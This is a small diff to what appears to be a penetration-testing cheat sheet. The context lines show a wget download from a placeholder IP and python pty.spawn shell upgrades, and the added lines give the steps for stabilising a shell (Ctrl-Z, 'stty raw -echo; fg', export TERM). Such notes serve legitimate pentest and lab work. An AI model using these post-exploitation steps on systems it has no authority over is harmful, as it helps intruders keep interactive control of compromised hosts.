@@ -392,4 +392,11 @@ wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 python -c 'import pty;pty.spawn("/bin/bash")'
+
+# Additional Functionality
+CTRL&Z
+stty raw -echo; fg;
+export TERM=xterm
+
+
 ```
